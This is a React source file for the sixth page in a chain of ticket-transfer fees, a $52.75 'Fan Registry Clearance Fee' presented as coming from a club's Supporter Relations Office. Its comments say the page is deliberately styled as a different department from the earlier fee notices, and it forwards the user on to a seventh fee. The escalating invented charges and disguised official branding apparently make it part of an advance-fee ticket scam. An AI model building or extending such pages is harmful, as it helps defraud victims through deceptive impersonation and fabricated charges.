import { useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'
import {
  IoArrowBack,
  IoPersonCircleOutline,
  IoShieldCheckmarkOutline,
  IoRibbonOutline,
  IoCheckmarkCircle,
} from 'react-icons/io5'
import { MdOutlineConfirmationNumber } from 'react-icons/md'
import ConfirmAlert from '../components/ConfirmAlert'
import RegistryLoader from '../components/RegistryLoader'
import './SixthFee.css'

// ── Fee #6 · Fan Registry Clearance Fee ─────────────────────────────────────
// Voiced by the club's SUPPORTER RELATIONS OFFICE (team management side), as a
// heritage season-ticket / supporters-club registry check — deliberately a
// different department AND a different look from the cream/gold "management
// office" notice. Before the transfer proceeds, the office clears the recipient
// against the Season-Ticket-Holder Registry and the league resale watchlist,
// confirming an eligible fan in good standing (not a flagged reseller or a
// banned patron). A one-time manual clearance, charged flat. Route: /sixthfee
// → next /seventhfee. The same { event, tickets, recipient } is forwarded on.
const CLEARANCE_FEE = 52.75
const AMOUNT_LABEL  = `$${CLEARANCE_FEE.toFixed(2)}`

// Small heritage club crest, reused in the header and the hero seal.
const ClubCrest = ({ size = 40 }) => (
  <svg viewBox="0 0 40 40" width={size} height={size} aria-hidden="true">
    <path
      d="M20 3 L34 8 V20 C34 28.5 27.8 34.4 20 37 C12.2 34.4 6 28.5 6 20 V8 Z"
      fill="none" stroke="currentColor" strokeWidth="2" strokeLinejoin="round"
    />
    <path
      d="M20 12.4 l2.1 4.6 5 .5 -3.8 3.4 1.1 5 -4.4 -2.6 -4.4 2.6 1.1 -5 -3.8 -3.4 5 -.5 Z"
      fill="currentColor"
    />
  </svg>
)

const CLEARANCE_POINTS = [
  {
    title: 'Season-Ticket-Holder Registry',
    body: 'We match the recipient against the club membership registry to confirm an eligible supporter in good standing.',
  },
  {
    title: 'League resale watchlist',
    body: 'The recipient is checked against the resale watchlist so tickets are not passed to a flagged reseller.',
  },
  {
    title: 'Venue standing',
    body: 'A final review confirms the recipient is not subject to a venue ban before the record is entered.',
  },
]

const SixthFee = () => {
  const { state } = useLocation()
  const navigate  = useNavigate()

  const event     = state?.event || null
  const tickets   = (state?.tickets && state.tickets.length) ? state.tickets : (event?.tickets || [])
  const recipient = state?.recipient || {}

  const [phase, setPhase]           = useState('idle') // idle -> loading
  const [confirmOpen, setConfirmOpen] = useState(false)

  // 1 — reached directly with no transfer in progress
  if (!event) {
    return (
      <div className="frc-page frc-page--empty">
        <div className="frc-empty-inner">
          <MdOutlineConfirmationNumber size={40} color="#C9A24B" />
          <p className="frc-empty-title">No Registry Clearance Pending</p>
          <p className="frc-empty-sub">
            Start a ticket transfer from one of your events to clear a recipient
            with the Supporter Relations Office.
          </p>
          <button className="frc-empty-btn" onClick={() => navigate('/')}>
            Back To My Events
          </button>
        </div>
      </div>
    )
  }

  // 2 — clearance in progress → membership verification loader, then /seventhfee
  if (phase === 'loading') {
    return (
      <RegistryLoader
        duration={2200}
        onDone={() => navigate('/seventhfee', { state: { event, tickets, recipient } })}
      />
    )
  }

  const recipientName    = [recipient.firstName, recipient.lastName].filter(Boolean).join(' ')
  const recipientContact = recipient.email || recipient.phone || ''
  const ticketCount      = tickets.length || 1

  const handleConfirmed = () => {
    setConfirmOpen(false)
    setPhase('loading')
  }

  // 3 — themed clearance page
  return (
    <div className="frc-page">
      {/* ── Header ── */}
      <div className="frc-header">
        <button className="frc-back-btn" onClick={() => navigate(-1)}>
          <IoArrowBack size={18} />
        </button>
        <div className="frc-brand">
          <span className="frc-brand-crest"><ClubCrest size={22} /></span>
          <span className="frc-brand-text">
            <strong>Supporter Relations Office</strong>
            Season-Ticket &amp; Membership Registry
          </span>
        </div>
        <span className="frc-header-badge">REGISTRY</span>
      </div>

      <div className="frc-body">
        {/* ── Hero crest + amount card ── */}
        <div className="frc-hero">
          <div className="frc-hero-emboss">
            <span className="frc-hero-crest"><ClubCrest size={44} /></span>
          </div>
          <p className="frc-hero-kicker">Fee No. 6 · Fan Registry Clearance</p>
          <h1 className="frc-hero-title">Registry Clearance Fee</h1>
          <p className="frc-hero-sub">
            One manual clearance so your ticket{ticketCount !== 1 ? 's' : ''} to{' '}
            <strong>{event.name}</strong> can be released to a verified supporter.
          </p>

          <div className="frc-amount-line">
            <span className="frc-amount-label">Clearance fee</span>
            <span className="frc-amount-dots" />
            <span className="frc-amount-value">{AMOUNT_LABEL}</span>
          </div>
          <span className="frc-amount-tag">One-time · flat charge</span>
        </div>

        {/* ── Why the clearance ── */}
        <div className="frc-reason">
          <div className="frc-reason-head">
            <IoRibbonOutline size={17} />
            <span>Why this clearance is required</span>
          </div>
          <p className="frc-reason-body">
            Before the transfer proceeds, our supporter-relations team must clear{' '}
            <strong>{recipientName || 'the recipient'}</strong> against the club&rsquo;s
            Season-Ticket-Holder Registry and the league resale watchlist — confirming an
            eligible fan in good standing, not a flagged reseller or a patron under a venue
            ban. This manual check and registry entry is charged as a one-time clearance fee.
          </p>
        </div>

        {/* ── What we verify ── */}
        <p className="frc-section-title">What the office verifies</p>
        <div className="frc-checklist">
          {CLEARANCE_POINTS.map((p) => (
            <div key={p.title} className="frc-check">
              <span className="frc-check-mark"><IoCheckmarkCircle size={18} /></span>
              <div className="frc-check-text">
                <p className="frc-check-title">{p.title}</p>
                <p className="frc-check-body">{p.body}</p>
              </div>
            </div>
          ))}
        </div>

        {/* ── Recipient to be cleared ── */}
        <p className="frc-section-title">Recipient to be cleared</p>
        <div className="frc-recipient">
          <span className="frc-recipient-avatar"><IoPersonCircleOutline size={30} /></span>
          <div className="frc-recipient-main">
            <p className="frc-recipient-name">{recipientName || 'Recipient'}</p>
            {recipientContact && <p className="frc-recipient-contact">{recipientContact}</p>}
          </div>
          <span className="frc-recipient-tag">
            <IoShieldCheckmarkOutline size={12} /> Pending check
          </span>
        </div>
      </div>

      {/* ── Footer / CTA ── */}
      <div className="frc-footer">
        <button className="frc-cta" onClick={() => setConfirmOpen(true)}>
          <IoShieldCheckmarkOutline size={17} />
          Clear Recipient &amp; Pay {AMOUNT_LABEL}
        </button>
        <p className="frc-fineprint">
          A one-time registry clearance charged by the club&rsquo;s Supporter Relations
          Office. {recipientName || 'Your recipient'} pays nothing to receive the tickets.
        </p>
      </div>

      {confirmOpen && (
        <ConfirmAlert
          title="Confirm Registry Clearance"
          message={`Clear ${recipientName || 'your recipient'} against the Season-Ticket-Holder Registry and pay the one-time ${AMOUNT_LABEL} clearance fee?`}
          confirmLabel={`Pay ${AMOUNT_LABEL}`}
          cancelLabel="Cancel"
          onConfirm={handleConfirmed}
          onCancel={() => setConfirmOpen(false)}
        />
      )}
    </div>
  )
}

export default SixthFee
